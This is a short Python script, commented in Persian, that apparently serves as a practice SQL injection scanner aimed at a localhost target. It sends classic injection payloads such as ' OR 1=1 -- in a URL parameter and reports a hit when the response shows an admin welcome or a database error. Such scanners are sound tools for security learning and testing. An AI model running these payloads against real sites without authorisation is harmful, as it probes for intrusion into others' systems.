import requests

def scan_sqli(url, param):
    print(f"[*] Testing {url} for SQL Injection...")
    
    # پیلودهای رایج برای تست SQLi
    payloads = [
        "'",
        "' OR 1=1 --",
        "' OR '1'='1"
    ]
    
    for payload in payloads:
        # ساخت آدرس تست
        test_url = f"{url}?{param}={payload}"
        try:
            r = requests.get(test_url, timeout=3)
            
            # اگه عبارت Welcome Admin یا خطای دیتابیس توی جواب بود
            if "Welcome Admin" in r.text or "SQL syntax" in r.text:
                print(f"[+] SQL Injection Found!")
                print(f"    Payload: {payload}")
                print(f"    URL: {test_url}")
                return
        except Exception as e:
            pass
            
    print("[-] No SQL Injection detected.")

if __name__ == "__main__":
    target_url = "http://127.0.0.1:8000/product"
    scan_sqli(target_url, "id")
